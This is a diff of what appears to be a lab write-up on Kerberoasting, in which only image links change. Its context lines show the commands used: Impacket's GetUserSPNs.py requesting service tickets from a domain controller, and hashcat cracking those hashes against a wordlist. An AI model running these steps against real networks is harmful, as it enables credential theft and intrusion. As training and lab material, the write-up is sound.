@@ -115,7 +115,7 @@ Hashcat found the passwords for both of the hashes.
 hashcat -m 13100 -a 0 hash.txt Pass.txt --show
 ```
 
-<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (82) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (80) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -125,7 +125,7 @@ hashcat -m 13100 -a 0 hash.txt Pass.txt --show
 sudo python3.9 /root/test/impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.226.108 -request > hashes.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (81) (1).png" alt=""><figcaption></figcaption></figure>
 
 Hashes were found for the same two accounts when doing this with Rubeus.
 
@@ -134,7 +134,7 @@ hashcat -m 13100 -a 0 hashes.txt Pass.txt
 hashcat -m 13100 -a 0 hashes.txt Pass.txt --show
 ```
 
-<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## AS-REP Roasting w/ Rubeus
 
